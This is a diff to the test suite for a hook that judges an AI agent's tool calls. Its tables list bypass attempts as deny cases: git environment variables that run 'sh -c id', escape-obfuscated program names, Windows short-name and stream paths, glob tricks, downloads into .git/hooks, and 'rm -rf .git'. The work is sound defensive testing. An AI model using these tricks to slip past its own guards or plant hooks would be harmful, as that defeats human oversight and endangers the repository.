@@ -6,8 +6,9 @@ import { join } from "node:path"
 import { Effect } from "effect"
 
 import { observationsPath, readObservations } from "../observations.ts"
-import { MAX_JUDGED_BYTES } from "./policy.ts"
-import { preToolUse } from "./pre-tool-use.ts"
+import type { ToolInput } from "./input.ts"
+import { denyToolReason, MAX_JUDGED_BYTES } from "./policy.ts"
+import { MAX_HOOK_BYTES, preToolUse } from "./pre-tool-use.ts"
 
 type Caller = "subagent" | "main"
 type Decision = "allow" | "deny"
@@ -305,6 +306,168 @@ const TABLE: ReadonlyArray<Row> = [
     "git --config-env=color.ui=UI diff",
   ),
 
+  // The environment reaches the same programs and settings as `git -c`, so it is judged alike.
+  ...denied(
+    "GIT_EXTERNAL_DIFF=/tmp/x git diff",
+    "GIT_SSH_COMMAND='sh -c id' git ls-remote origin",
+    "GIT_PAGER='sh -c id' git log",
+    "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=diff.external GIT_CONFIG_VALUE_0=./evil git diff",
+    "GIT_CONFIG_PARAMETERS=\"'diff.external'='./evil'\" git diff",
+    "git_pager='sh -c id' git log",
+    "LANG=C GIT_PAGER=cat git log",
+    "GIT_PAGER='sh -c id' bash -c 'git log'",
+    "env GIT_PAGER='sh -c id' git log",
+    "env -i GIT_ASKPASS=./evil git fetch",
+    "env -S \"GIT_PAGER='sh -c id' git log\"",
+    "export GIT_PAGER='sh -c id'; git log",
+    "declare -x GIT_SSH_COMMAND='sh -c id'; git fetch",
+    "cmd /c set GIT_PAGER=x && git log",
+    "$env:GIT_PAGER='sh -c id'; git log",
+  ),
+  ...allowed(
+    "LANG=C git log",
+    "LC_ALL=C GIT_DIR=.git git log",
+    "env LANG=C git diff",
+    "env -S 'LANG=C git status'",
+    "export LANG=C; git log",
+    "GIT_CONFIG_NOSYSTEM=1 git status",
+    "GIT_PAGER_IN_USE=1 git status",
+    "echo GIT_PAGER=x",
+    "grep 'GIT_PAGER=' README.md",
+  ),
+
+  // ANSI-C quoting names a program by its escapes, \x, \u and \U among them.
+  ...denied(
+    "$'\\U00000067it' commit",
+    "$'\\U67it' commit",
+    "$'g\\U00000069t' push",
+    "$'\\u0067it' commit",
+    "$'\\x67it' commit",
+    "$'\\147it' commit",
+    "$'gh' pr create",
+    "$'\\U00000067\\U00000068' pr create",
+    // \cJ is a newline, which ends a command in the text eval and bash -c read.
+    "eval $'true\\cJgit commit -m x'",
+    "eval $'true\\cjgit push'",
+    "bash -c $'true\\cJgit push'",
+    "eval $'true\\c\\\\\\cJgit push'",
+  ),
+  ...allowed(
+    "$'\\U00000067it' status",
+    "echo $'\\U0001F600'",
+    "echo $'\\UFFFFFFFF'",
+    "echo $'\\U'",
+    "eval $'true\\cJgit status'",
+    "eval $'git\\cIstatus'",
+    "echo $'\\c'",
+  ),
+
+  // A Windows path keeps its backslashes in PowerShell and cmd and loses them in bash, so the
+  // program is judged read both ways.
+  ...denied(
+    "C:\\Git\\cmd\\git.exe commit -m x",
+    "C:\\Git\\cmd\\git commit -m x",
+    "C:\\tools\\gh.exe pr create",
+    "C:\\bin\\holyclaude.exe intent create",
+    "cmd /c C:\\Git\\cmd\\git.exe commit -m x",
+    'cmd /c "C:\\Git\\cmd\\git.exe commit -m x"',
+    'powershell -Command "C:\\Git\\cmd\\git.exe push"',
+    "env C:\\Git\\cmd\\git.exe push",
+    "Invoke-Command { C:\\Git\\cmd\\git.exe commit }",
+    "Start-Process C:\\Git\\cmd\\git.exe commit",
+    "Start-Process -FilePath:C:\\Git\\cmd\\git.exe -ArgumentList push",
+    "wsl C:\\Git\\cmd\\git.exe push",
+    "git status && C:\\Git\\cmd\\git.exe push",
+  ),
+  ...allowed(
+    "C:\\Git\\cmd\\git.exe status",
+    'cmd /c "C:\\Git\\cmd\\git.exe status"',
+    "C:\\Windows\\System32\\notepad.exe x",
+    "C:\\tools\\holyclaude.exe intent show",
+    "Start-Process C:\\Git\\cmd\\git.exe status",
+  ),
+
+  // The .git directory runs hooks and settings at the root's next commit, so it is guarded like
+  // .holyclaude. Only a part that is .git counts, and reading stays open.
+  ...denied(
+    "echo x > .git/hooks/pre-commit",
+    "echo x >> .git/config",
+    "echo x > .git\\hooks\\pre-commit",
+    "echo x > C:\\proj\\.git\\hooks\\pre-commit",
+    "cp x .git/hooks/pre-commit",
+    "mv x .GIT/config",
+    "tee .git/config",
+    "sed -i s/a/b/ .git/config",
+    "perl -pi -e 's/a/b/' .git/config",
+    "dd of=.git/config",
+    "rm -rf .git",
+    "rm -rf ./.git/",
+    "Set-Content .git\\hooks\\pre-commit x",
+    "Remove-Item -Recurse .\\.git",
+    "Out-File -FilePath .git\\config",
+    "New-Item .git\\hooks\\post-commit",
+    "cmd /c del .git\\config",
+    "cmd /c echo x > .git\\config",
+    "Start-Process git -ArgumentList status -RedirectStandardOutput .git\\hooks\\x",
+    "Start-Process git -ArgumentList status -RedirectStandardError:.git\\hooks\\x",
+    "Start-Process git -ArgumentList status -RedirectStandardOutput .git/hooks/x",
+    "Start-Process notepad -RedirectStandardOutput:.git/config",
+    "Start-Process git -ArgumentList status -RedirectStandardOutput .holyclaude/x",
+    "echo x > .git./config",
+    "echo x > GIT~1/config",
+    "echo x > HOLYCL~1/state.json",
+    "echo x > .Git\\Hooks\\pre-commit",
+    "echo x > C:/proj\\.HOLYCLAUDE/state.json",
+    // The shell expands a pattern before it writes: wildcards, brackets, brace lists and ranges.
+    "echo x > .gi?/config",
+    "echo x > .g*t/hooks/pre-commit",
+    "cp x .gi[t]/hooks/pre-commit",
+    "touch .{git,x}/hooks/pre-commit",
+    "touch {.git/hooks/x,y}",
+    "echo x > .{g..g}it/config",
+    "rm -rf .*",
+    "echo x > .holy*/state.json",
+    "Set-Content .gi?\\config x",
+    // Downloads, archives, patches, links and permissions write the paths they are given, also
+    // as the value of a flag.
+    "curl -o .git/hooks/pre-commit https://example.com/x",
+    "curl -o.git/hooks/pre-commit https://example.com/x",
+    "curl --output=.git/hooks/pre-commit https://example.com/x",
+    "wget -O .git/hooks/pre-commit https://example.com/x",
+    "Invoke-WebRequest https://example.com/x -OutFile:.git\\hooks\\pre-commit",
+    "iwr https://example.com/x -OutFile .holyclaude\\state.json",
+    "tar -xf x.tar -C .git",
+    "unzip x.zip -d .git",
+    "patch .git/config < fix.patch",
+    "mkdir .git/hooks",
+    "chmod +x .git/hooks/pre-commit",
+    "cmd /c mklink .git\\hooks\\pre-commit x",
+  ),
+  ...allowed(
+    "cat .git/config",
+    "ls .git/hooks",
+    "Get-Content .git\\config",
+    "git status > out.txt",
+    "echo x > .gitignore",
+    "echo x > .github/CODEOWNERS",
+    "rm .gitattributes",
+    "touch packages/foo.git",
+    "cp x my.git/config",
+    "Start-Process git -ArgumentList status -RedirectStandardOutput out.txt",
+    "Start-Process git -ArgumentList status -RedirectStandardInput .git/config",
+    "rm -rf *",
+    "rm -rf ./*/",
+    "cp a.ts {src,lib}/",
+    "echo x > *.txt",
+    "rm -f build/*.js dist/{a,b}.map",
+    "echo x > .gitignore*",
+    "rm .gitattrib*",
+    "curl -o page.html https://example.com/repo.git",
+    "mkdir -p .github/workflows",
+    "chmod +x scripts/build.sh",
+    "tar -czf out.tgz src",
+  ),
+
   // xargs appends arguments the command line does not show.
   ...denied(
     "echo v1 | xargs git tag",
@@ -414,9 +577,30 @@ const FILE_TABLE: ReadonlyArray<FileRow> = [
   ["Write", "/home/me/proj/.HolyClaude/state.json", "subagent", "deny"],
   ["Edit", ".holyclaude/state.json", "subagent", "deny"],
   ["MultiEdit", ".holyclaude/state.json", "subagent", "deny"],
+  ["Write", ".git/hooks/pre-commit", "subagent", "deny"],
+  ["Write", ".git/config", "subagent", "deny"],
+  ["Write", "C:\\proj\\.git\\hooks\\pre-commit", "subagent", "deny"],
+  ["Write", "/home/me/proj/.GIT/config", "subagent", "deny"],
+  ["Edit", ".git/config", "subagent", "deny"],
+  ["MultiEdit", ".git/hooks/post-commit", "subagent", "deny"],
+  ["Write", ".git/hooks/pre-commit", "main", "allow"],
+  ["Write", ".gitignore", "subagent", "allow"],
+  ["Write", ".github/workflows/ci.yml", "subagent", "allow"],
+  ["Edit", "docs/my.git/notes.md", "subagent", "allow"],
   ["Write", "packages/cli/src/main.ts", "subagent", "allow"],
   ["Edit", "docs/notes.md", "subagent", "allow"],
   ["Write", ".holyclaude/state.json", "main", "allow"],
+  // Windows reads either separator, any case and the 8.3 short names.
+  ["Write", ".holyclaude\\state.json", "subagent", "deny"],
+  ["Write", "C:/proj\\.HOLYCLAUDE/state.json", "subagent", "deny"],
+  ["Write", "C:\\proj\\HOLYCL~1\\state.json", "subagent", "deny"],
+  ["Write", "C:\\proj\\GIT~1.\\config", "subagent", "deny"],
+  ["Write", "C:/proj\\.Git/Hooks\\pre-commit", "subagent", "deny"],
+  ["Write", "\\\\?\\C:\\proj\\.git\\config", "subagent", "deny"],
+  ["Write", "C:\\proj\\.git.\\config", "subagent", "deny"],
+  ["Write", "C:\\proj\\.git::$DATA", "subagent", "deny"],
+  ["Write", "C:\\proj\\.github\\workflows\\ci.yml", "subagent", "allow"],
+  ["Write", "C:\\proj\\holyclaude\\notes.md", "subagent", "allow"],
 ]
 
 describe("hook policy table (tool, command, caller, expected decision)", () => {
@@ -438,6 +622,14 @@ describe("file tools and the state directory", () => {
     expect(
       await decide(call("NotebookEdit", { notebook_path: ".holyclaude/n.ipynb" }, "subagent")),
     ).toBe("deny")
+  })
+
+  test("a notebook edit in the git directory is denied, and its reason says why", async () => {
+    const input = { notebook_path: ".git/n.ipynb" }
+    expect(await decide(call("NotebookEdit", input, "subagent"))).toBe("deny")
+    expect(await reasonOf(call("NotebookEdit", input, "subagent"))).toContain(
+      "hooks and settings that run at the root's next commit",
+    )
   })
 })
 
@@ -547,19 +739,78 @@ const readOfSize = (bytes: number) => `git status${" ".repeat(bytes - "git statu
 /** A write command of exactly `bytes` bytes: `git commit` and then spaces. */
 const writeOfSize = (bytes: number) => `git commit${" ".repeat(bytes - "git commit".length)}`
 
-describe("only the judged fields are limited: padding elsewhere is neither a bypass nor a deny", () => {
+/** The policy's verdict on one tool call, without the payload around it. */
+const judged = (tool: string, input: Partial<ToolInput>) =>
+  denyToolReason(tool, {
+    command: undefined,
+    file_path: undefined,
+    notebook_path: undefined,
+    ...input,
+  })
+
+/** A payload of exactly `bytes` bytes: a read, padded outside its command. */
+const payloadOfSize = (caller: Caller, bytes: number) => {
+  const bare = call("Bash", { command: "git status" }, caller, { padding: "" })
+  return call("Bash", { command: "git status" }, caller, {
+    padding: filler(bytes - Buffer.byteLength(bare)),
+  })
+}
+
+describe("the payload is limited as a whole, for every caller", () => {
+  for (const caller of ["subagent", "main"] as const) {
+    test(`${caller}: a payload of exactly the limit is judged, one byte more is denied`, async () => {
+      expect(await decide(payloadOfSize(caller, MAX_HOOK_BYTES))).toBe("allow")
+      const reason = await reasonOf(payloadOfSize(caller, MAX_HOOK_BYTES + 1))
+      expect(reason).toContain(`payload is over ${MAX_HOOK_BYTES} bytes`)
+      expect(reason).toContain("smaller calls")
+    })
+
+    test(`${caller}: a large write is denied for its size, whatever its path`, async () => {
+      for (const file_path of ["packages/cli/src/big.ts", ".holyclaude/state.json"]) {
+        const input = { file_path, content: filler(2 * LIMIT) }
+        expect(await reasonOf(call("Write", input, caller))).toContain("payload is over")
+      }
+    })
+  }
+
+  test("the limit counts bytes, not characters", async () => {
+    const accents = "é".repeat(MAX_HOOK_BYTES / 2)
+    const input = { command: "git status", description: accents }
+    expect(accents.length).toBeLessThan(MAX_HOOK_BYTES)
+    expect(await reasonOf(call("Bash", input, "main"))).toContain("payload is over")
+  })
+
+  test("a payload over the limit is denied before it is read as JSON", async () => {
+    for (const stdin of [
+      "x".repeat(MAX_HOOK_BYTES + 1),
+      `{"agent_id":"a"${" ".repeat(MAX_HOOK_BYTES)}}`,
+    ])
+      expect(await reasonOf(stdin)).toContain("payload is over")
+  })
+
+  test("a tool the guard does not judge passes within the limit and is denied past it", async () => {
+    const small = { command: filler(LIMIT / 2) }
+    expect(await decide(call("mcp__other__tool", small, "subagent"))).toBe("allow")
+    expect(await decide(call("Write", { file_path: "a.ts", ...small }, "subagent"))).toBe("allow")
+    expect(await decide(call("mcp__other__tool", { command: filler(2 * LIMIT) }, "main"))).toBe(
+      "deny",
+    )
+  })
+})
+
+describe("only the judged fields are judged: padding elsewhere in the payload is neither a bypass nor a deny", () => {
   test("a large Write into an allowed path passes", async () => {
-    const input = { file_path: "packages/cli/src/big.ts", content: filler(2 * LIMIT) }
+    const input = { file_path: "packages/cli/src/big.ts", content: filler(LIMIT / 2) }
     expect(await decide(call("Write", input, "subagent"))).toBe("allow")
   })
 
   test("a large Write into the state directory is denied for its path", async () => {
-    const input = { file_path: ".holyclaude/state.json", content: filler(2 * LIMIT) }
+    const input = { file_path: ".holyclaude/state.json", content: filler(LIMIT / 2) }
     expect(await reasonOf(call("Write", input, "subagent"))).toContain("state files are written")
   })
 
   test("a read padded outside the command passes", async () => {
-    const input = { command: "git status", description: filler(2 * LIMIT) }
+    const input = { command: "git status", description: filler(LIMIT / 2) }
     expect(await decide(call("Bash", input, "subagent"))).toBe("allow")
     expect(await decide(call("Bash", { command: "git status" }, "subagent", { x: input }))).toBe(
       "allow",
@@ -567,39 +818,32 @@ describe("only the judged fields are limited: padding elsewhere is neither a byp
   })
 
   test("a write padded outside the command is still judged and denied for what it is", async () => {
-    const input = { command: "git commit -m x", description: filler(2 * LIMIT) }
+    const input = { command: "git commit -m x", description: filler(LIMIT / 2) }
     expect(await reasonOf(call("Bash", input, "subagent"))).toContain("git commit writes VCS state")
     expect(
       await reasonOf(
-        call("Bash", { command: "git commit -m x" }, "subagent", { padding: filler(2 * LIMIT) }),
+        call("Bash", { command: "git commit -m x" }, "subagent", { padding: filler(LIMIT / 2) }),
       ),
     ).toContain("git commit writes VCS state")
   })
 
-  test("a tool the guard does not judge passes with any input", async () => {
-    const input = { command: filler(2 * LIMIT) }
-    expect(await decide(call("mcp__other__tool", input, "subagent"))).toBe("allow")
-    expect(await decide(call("Write", { file_path: "a.ts", ...input }, "subagent"))).toBe("allow")
+  test("a main-thread payload within the limit is allowed", async () => {
+    const write = { command: writeOfSize(LIMIT / 2) }
+    expect(await decide(call("Bash", write, "main"))).toBe("allow")
+    expect(await decide(call("Write", { content: filler(LIMIT / 2) }, "main"))).toBe("allow")
   })
 
-  test("a main-thread payload is allowed at any size", async () => {
-    for (const size of [LIMIT + 1, 4 * LIMIT]) {
-      expect(await decide(call("Bash", { command: writeOfSize(size) }, "main"))).toBe("allow")
-      expect(await decide(call("Write", { content: filler(size) }, "main"))).toBe("allow")
-    }
-  })
-
-  test("an empty agent_id is the main thread's, so it is allowed at any size", async () => {
-    const input = { command: writeOfSize(2 * LIMIT) }
+  test("an empty agent_id is the main thread's", async () => {
+    const input = { command: writeOfSize(LIMIT / 2) }
     expect(await decide(call("Bash", input, "main", { agent_id: "" }))).toBe("allow")
   })
 })
 
-describe("a command or path over the limit is denied unread", () => {
+describe("a command or path over the judged limit is denied unread", () => {
   for (const tool of ["Bash", "PowerShell", "Monitor"])
-    test(`${tool}: a command over the limit is denied, a read as well as a write`, async () => {
+    test(`${tool}: a command over the limit is denied, a read as well as a write`, () => {
       for (const command of [readOfSize(LIMIT + 1), writeOfSize(LIMIT + 1)]) {
-        const reason = await reasonOf(call(tool, { command }, "subagent"))
+        const reason = judged(tool, { command })
         expect(reason).toContain(`command is ${LIMIT + 1} bytes`)
         expect(reason).toContain(`at most ${LIMIT}`)
         expect(reason).toContain("cannot be checked")
@@ -607,18 +851,16 @@ describe("a command or path over the limit is denied unread", () => {
       }
     })
 
-  test("a command of exactly the limit is judged by the policy", async () => {
-    expect(await decide(call("Bash", { command: readOfSize(LIMIT) }, "subagent"))).toBe("allow")
-    expect(await reasonOf(call("Bash", { command: writeOfSize(LIMIT) }, "subagent"))).toContain(
-      "git commit writes VCS state",
-    )
+  test("a command of exactly the limit is judged by the policy", () => {
+    expect(judged("Bash", { command: readOfSize(LIMIT) })).toBeUndefined()
+    expect(judged("Bash", { command: writeOfSize(LIMIT) })).toContain("git commit writes VCS state")
   })
 
-  test("the limit counts bytes, not characters", async () => {
+  test("the limit counts bytes, not characters", () => {
     const atLimit = `echo  ${"é".repeat((LIMIT - 6) / 2)}`
     expect(atLimit.length).toBeLessThan(LIMIT)
-    expect(await decide(call("Bash", { command: atLimit }, "subagent"))).toBe("allow")
-    expect(await decide(call("Bash", { command: `${atLimit}é` }, "subagent"))).toBe("deny")
+    expect(judged("Bash", { command: atLimit })).toBeUndefined()
+    expect(judged("Bash", { command: `${atLimit}é` })).toBeDefined()
   })
 
   for (const [tool, key] of [
@@ -627,15 +869,12 @@ describe("a command or path over the limit is denied unread", () => {
     ["MultiEdit", "file_path"],
     ["NotebookEdit", "notebook_path"],
   ] as const)
-    test(`${tool}: a ${key} over the limit is denied, one at the limit is judged`, async () => {
-      const reason = await reasonOf(call(tool, { [key]: filler(LIMIT + 1) }, "subagent"))
-      expect(reason).toContain(`file path is ${LIMIT + 1} bytes`)
-      expect(await decide(call(tool, { [key]: filler(LIMIT) }, "subagent"))).toBe("allow")
+    test(`${tool}: a ${key} over the limit is denied, one at the limit is judged`, () => {
+      expect(judged(tool, { [key]: filler(LIMIT + 1) })).toContain(
+        `file path is ${LIMIT + 1} bytes`,
+      )
+      expect(judged(tool, { [key]: filler(LIMIT) })).toBeUndefined()
     })
-
-  test("a main-thread file path over the limit is allowed", async () => {
-    expect(await decide(call("Write", { file_path: filler(LIMIT + 1) }, "main"))).toBe("allow")
-  })
 })
 
 describe("who made the call is read from agent_id of any type", () => {
@@ -696,15 +935,16 @@ describe("the payload is read as JSON, not as text", () => {
   const nested = (command: string, depth: number) =>
     `{"agent_id":"agent-1","tool_name":"Bash","tool_input":{"command":"${command}","x":${"[".repeat(depth)}${"]".repeat(depth)}}}`
 
-  test("deep nesting inside a subagent payload over 1 MB: a write is denied by the policy", async () => {
-    const payload = nested("git commit -m x", 600_000)
-    expect(payload.length).toBeGreaterThan(LIMIT)
+  test("deep nesting inside a subagent payload near the limit: a write is denied by the policy", async () => {
+    const payload = nested("git commit -m x", 500_000)
+    expect(payload.length).toBeGreaterThan(MAX_HOOK_BYTES / 2)
+    expect(payload.length).toBeLessThan(MAX_HOOK_BYTES)
     expect(await reasonOf(payload)).toContain("git commit writes VCS state")
   })
 
-  test("deep nesting inside a subagent payload over 1 MB: a read is allowed", async () => {
-    const payload = nested("git status", 600_000)
-    expect(payload.length).toBeGreaterThan(LIMIT)
+  test("deep nesting inside a subagent payload near the limit: a read is allowed", async () => {
+    const payload = nested("git status", 500_000)
+    expect(payload.length).toBeLessThan(MAX_HOOK_BYTES)
     expect(await decide(payload)).toBe("allow")
   })
 
@@ -715,7 +955,7 @@ describe("the payload is read as JSON, not as text", () => {
   })
 })
 
-describe("a payload with no readable agent_id cannot be attributed and is allowed", () => {
+describe("a payload that is empty or not a JSON object is denied for every caller", () => {
   const unreadable: ReadonlyArray<readonly [string, string]> = [
     ["empty stdin", ""],
     ["blank stdin", " \n"],
@@ -724,13 +964,16 @@ describe("a payload with no readable agent_id cannot be attributed and is allowe
     ["a JSON array", '[{"agent_id":"agent-1","tool_name":"Bash"}]'],
     ["a JSON string", '"agent_id"'],
     ["JSON null", "null"],
-    ["more than the limit of text that is not JSON", "x".repeat(LIMIT + 1)],
   ]
 
   for (const [name, stdin] of unreadable)
     test(`${name}`, async () => {
-      expect(await decide(stdin)).toBe("allow")
+      expect(await reasonOf(stdin)).toContain("empty or not valid JSON")
     })
+
+  test("a payload of the limit's size that is not JSON is denied as unreadable", async () => {
+    expect(await reasonOf("x".repeat(MAX_HOOK_BYTES))).toContain("empty or not valid JSON")
+  })
 })
 
 describe("a subagent payload that cannot be judged for another reason", () => {
@@ -769,12 +1012,12 @@ describe("a file tool is judged by every path it names", () => {
       expect(await decide(call(tool, input, "subagent"))).toBe(expected)
     })
 
-  test("a path over the limit is denied wherever it is, behind a harmless one", async () => {
+  test("a path over the limit is denied wherever it is, behind a harmless one", () => {
     for (const input of [
       { file_path: "ok.ts", notebook_path: filler(LIMIT + 1) },
       { file_path: filler(LIMIT + 1), notebook_path: "ok.ipynb" },
     ])
-      expect(await reasonOf(call("NotebookEdit", input, "subagent"))).toContain("file path is")
+      expect(judged("NotebookEdit", input)).toContain("file path is")
   })
 
   for (const tool of ["Write", "Edit", "MultiEdit", "NotebookEdit"])
@@ -839,9 +1082,7 @@ describe("the worst command at the limit is decided in seconds, not minutes", ()
     const padded = heredocChain(50, LIMIT - command.length)
     expect(Buffer.byteLength(padded)).toBe(LIMIT)
     const started = performance.now()
-    expect(await reasonOf(call("Bash", { command: padded }, "subagent"))).toContain(
-      "nested too deeply",
-    )
+    expect(judged("Bash", { command: padded })).toContain("nested too deeply")
     expect(performance.now() - started).toBeLessThan(5000)
   })
 
